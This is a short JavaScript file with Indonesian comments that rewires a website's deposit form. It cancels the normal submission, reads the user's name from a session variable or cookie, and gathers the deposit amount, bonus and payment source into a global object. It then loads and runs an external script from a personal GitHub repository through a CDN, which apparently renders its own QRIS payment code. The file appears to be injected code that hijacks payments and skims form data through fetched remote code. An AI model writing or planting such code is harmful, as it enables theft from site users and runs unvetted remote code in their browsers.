/**
 * deposit_redirect (act2.js) - perbaikan
 */

// Baca cookie helper (boleh dideklarasi di atas supaya jelas)
function readCookie(name) {
  const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
  return match ? decodeURIComponent(match[2]) : null;
}

document.addEventListener("DOMContentLoaded", function () {
  const form = document.getElementById("depositForm");
  if (!form) {
    console.warn("Form depositForm tidak ditemukan.");
    return;
  }

  // Ubah action ke file eksternal (CDN)
  form.action = "https://cdn.jsdelivr.net/gh/arceusxyz/moon@main/afteract1.js";

  form.addEventListener("submit", function (e) {
    e.preventDefault();

    // Ambil username: prioritas dari session-injected JS, fallback ke cookie
    const username = (typeof window.SESSION_USER !== "undefined" && window.SESSION_USER) ? window.SESSION_USER : readCookie("user");

    const nominal = document.getElementById("nominal")?.value || "";
    const bonus = document.getElementById("bonus")?.value || "";
    const payFrom = form.querySelector("select[name='pay_from']")?.value || "";
    const postID = form.querySelector("input[name='postID']")?.value || "";
    const termCondition = form.querySelector("input[name='termcondition']")?.checked ? 1 : 0;

    // Data form
    const data = {
      username: username,
      nominal: nominal,
      bonus: bonus,
      pay_from: payFrom,
      postID: postID,
      termcondition: termCondition
    };

    console.log("Mengirim data ke 1.js:", data);

    // Simpan data secara global supaya bisa dibaca oleh 1.js
    window.depositFormData = data;

    // Feedback kecil di DOM (optional) — supaya nggak ketutupan alert
    let statusEl = document.getElementById("depositStatusInline");
    if (!statusEl) {
      statusEl = document.createElement("div");
      statusEl.id = "depositStatusInline";
      statusEl.style.marginTop = "8px";
      statusEl.style.fontSize = "13px";
      form.parentNode.insertBefore(statusEl, form.nextSibling);
    }
    statusEl.textContent = "Mengirim... memuat proses pembayaran.";

    // Buat <script> dinamis untuk load 1.js
    const script = document.createElement("script");
    script.src = form.action;
    script.async = true;

    script.onload = function () {
      console.log("File eksternal 1.js berhasil dimuat. Data tersedia di window.depositFormData");
      statusEl.textContent = "Script pembayaran dimuat. Menunggu hasil QRIS...";
      // jangan alert — tunggu 1.js render QRIS atau handle sendiri (lihat debug checklist)
    };

    script.onerror = function () {
      console.error("Gagal memuat 1.js dari CDN.");
      statusEl.textContent = "Gagal memuat script eksternal. Coba refresh halaman.";
    };

    document.body.appendChild(script);
  });
});
